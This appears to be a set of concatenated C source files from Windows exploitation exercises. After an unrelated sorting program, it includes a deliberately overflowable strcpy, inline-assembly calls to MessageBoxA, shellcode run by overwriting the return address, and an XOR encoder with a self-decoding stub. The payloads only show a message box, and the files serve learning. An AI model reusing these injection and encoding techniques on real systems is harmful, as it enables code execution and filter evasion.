#include <bits/stdc++.h>
using namespace std;

int x[105];

int main()
{
    int n;
    cin >> n;
    int count = n;

    for (int i = 0; i < n; i++)
    {
        cin >> x[i];
    }

    sort(x, x + n); // 先排好序

    for (int i = 0; i < n; i++)
    {
        cout << x[i] << " ";
    }

    // int i = 1;
    // while (i <= n - 1)
    // {
    //     if (x[i] == x[i - 1])
    //     {
    //         for (int j = i + 1; j <= n - 1; j++) // 前移一位
    //         {
    //             x[j - 1] = x[j];
    //         }
    //         count--;
    //     }
    //     else
    //     {
    //         i++;
    //     }
    // }

    // cout << count << endl;
    // for (int i = 0; i < count; i++)
    // {
    //     cout << x[i] << " ";
    // }
    return 0;
}

#include "stdio.h"
#include "windows.h"
#include "stdlib.h"

#define REGCODE "12345678"

int verify(char *code)
{
    int flag;
    char buffer[44];
    flag = strcmp(REGCODE, code);
    strcpy(buffer, code);
    return flag;
}

int main(int argc, char *argv[])
{
    int vFlag = 0;
    char regcode[1024];
    LoadLibrary("user32.dll");
    FILE *fp;
    if (!(fp = fopen("reg.txt", "rw+")))
        exit(0);
    fscanf(fp, "%s", regcode);
    vFlag = verify(regcode);
    if (vFlag)
        printf("wrong regcode!");
    else
        printf("passed!");
    fclose(fp);
    return 0;
}

#include <windows.h>
#include <stdio.h>

int main(int argc, char *argv[])
{
    HINSTANCE LibHandle;
    FARPROC ProcAdd;
    LibHandle = LoadLibrary("user32");
    printf("user32 = 0x%x\n", LibHandle);
    ProcAdd = (FARPROC)GetProcAddress(LibHandle, "MessageBoxA");
    printf("MessageBoxA = 0x%x \n", ProcAdd);
    getchar();
    return 0;
}

#include <windows.h>

int main(int argc, char *argv[])
{
    MessageBox(NULL, NULL, NULL, 0);
    return 0;
}

#include "windows.h"

int main(int argc, char *argv[])
{
    LoadLibrary("user32.dll");
    _asm
    {
        xor ebx,ebx
        push ebx
        push ebx
        push ebx
        push ebx
        mov eax,0x77D507EA
        call eax
    }
    return 0;
}

#include <windows.h>

char ourshellcode[] = "\x33\xDB\x53\x53\x53\x53\xB8\xEA\x07\xD5\x77\xFF\xD0";

int main(int argc, char *argv[])
{
    LoadLibrary("user32.dll");
    int *ret;
    ret = (int *)&ret + 2;
    (*ret) = (int)ourshellcode;
    return 0;
}

#include "windows.h"

int main(int argc, char *argv[])
{
    LoadLibrary("user32.dll");
    _asm
    { 
        xor ebx,ebx
        push ebx
        push 0x20696577 
        push 0x6E65687A 
        push 0x6F75687A
        mov eax, esp 
        push ebx 
        push eax 
        push eax 
        push ebx 
        mov eax, 0x77D507EA 
        call eax
    }
    return 0;
}

#include "windows.h"

void encoder(char *input, unsigned char key)
{
    int len = strlen(input);
    unsigned char *output = (unsigned char *)malloc(len + 1);
    for (int i = 0; i < len; i++)
    {
        output[i] = input[i] ^ key;
    }
    FILE *fp;
    if (!(fp = fopen("encode.txt", "w")))
    {
        exit(0);
    }
    fprintf(fp, "%s", output);
    fclose(fp);
}

int main(int argc, char *argv[])
{
    char shellcode[] = "\x33\xDB\x53\x68\x72\x6C\x64\x20"
                       "\x68\x6F\x20\x77\x6F\x68\x68\x65"
                       "\x6C\x6C\x8B\xC4\x53\x50\x50\x53"
                       "\xB8\xEA\x07\xD5\x77\xFF\xD0";
    encoder(shellcode, 0x44);
    return 0;
}

int main(int argc, char *argv[])
{
    _asm {
    call lable;
lable:
    pop eax;
    add eax, 0x15
    xor ecx, ecx
decode_loop: mov bl, [eax + ecx] 
    xor bl, 0x44
    mov [eax + ecx], bl
    inc ecx
    cmp bl, 0x90
    jne decode_loop
    }
    return 0;
}

char shellcode[] = "\xE8\x00\x00\x00\x00\x58\x83\xC0"
                   "\x15\x33\xC9\x8A\x1C\x08\x80\xF3"
                   "\x44\x88\x1C\x08\x41\x80\xFB\x90"
                   "\x75\xF1"
                   "\x77\x9F\x17\x2C\x36\x28\x20\x64"
                   "\x2C\x2B\x64\x33\x2B\x2C\x2C\x21"
                   "\x28\x28\xCF\x80\x17\x14\x14\x17"
                   "\xFC\xAE\x43\x01\x3A\xBB\x94\xCD\xFD\xFD\xFD\xFD";

int main(int argc, char *argv[])
{
    LoadLibrary("user32.dll");
    int *ret;
    ret = (int *)&ret + 2;
    (*ret) = (int)shellcode;
    return 0;
}